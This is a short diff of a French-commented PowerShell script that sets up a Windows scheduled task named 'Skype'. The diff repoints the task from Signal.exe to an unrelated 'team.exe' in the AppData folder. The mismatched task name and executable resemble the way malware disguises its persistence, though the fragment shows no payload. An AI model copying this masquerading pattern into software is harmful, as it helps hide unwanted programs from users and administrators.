@@ -1,11 +1,10 @@
 # 📌 Nom de la tâche
 $TaskName = "Skype"
-#$ExePath = "C:\Users\skedu\AppData\Local\Programs\signal-desktop\Signal.exe"  # Programme dans AppData\Local
 
 $LocalAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
 
 # 📌 Chemin vers l'exécutable Signal.exe
-$ExePath = "$LocalAppData\Programs\signal-desktop\Signal.exe"
+$ExePath = "$LocalAppData\team.exe"
 
 # 📌 Définir l'action : exécuter le programme
 $Action = New-ScheduledTaskAction -Execute $ExePath
